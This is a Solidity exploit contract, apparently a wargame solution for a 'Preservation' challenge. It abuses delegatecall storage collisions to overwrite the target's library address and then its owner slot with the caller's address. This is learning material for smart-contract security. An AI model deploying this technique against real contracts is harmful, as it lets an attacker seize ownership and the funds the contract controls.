// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version


import '../contracts/Preservation.sol';


contract HackPreservation {
    // Complete with the instance's address
    Preservation public originalContract = Preservation(0x65Ad08Dd5A6bEF8BB094aDAe5DbBDa91D9785b6F);
    // You're going to fill the second slot with random data
    address notUsed = address(this);
    // The third one it's going to be your address, so you can override the owner variable
    uint toOverride;

    function hack() public {
        // You're gonna set the first library to be this contract
        originalContract.setFirstTime(uint256(uint160(address(this))));
        // Then, you're gonna call the function setTime throw the Preservation contract
        originalContract.setFirstTime(uint256(uint160(tx.origin)));
    }

    function setTime(uint _time) public {
        // This way you're overriding the owner slot with your address
        toOverride = _time;
    }
}
